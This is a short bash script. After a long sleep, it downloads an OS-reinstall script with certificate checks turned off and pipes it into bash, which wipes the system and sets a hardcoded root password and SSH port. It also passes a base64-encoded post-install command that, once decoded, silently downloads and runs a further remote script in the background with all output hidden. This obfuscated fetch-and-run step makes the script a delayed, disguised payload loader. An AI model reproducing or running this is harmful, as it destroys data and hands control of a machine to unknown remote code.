#!/bin/bash

#202407231
sleep 90000
###sleep "$[`od -An -N2 -i /dev/urandom` % 10800 + 27000]"


bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/MoeClub/Note/master/InstallNET.sh) -d 12 -v 64 -a -p "Ls.123456" -port 2233 -cmd "IyEvYmluL2Jhc2gKCmFwdCAtcXF5IGluc3RhbGwgd2dldApiYXNoIDwod2dldCAtcU8tIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jdXJpb3NpdHlpbnRlcmlvcnN1ay8yMDg4L21haW4vemg4OGtrMi5zaCkgPj4vZGV2L251bGwgMj4mMSAmCg=="
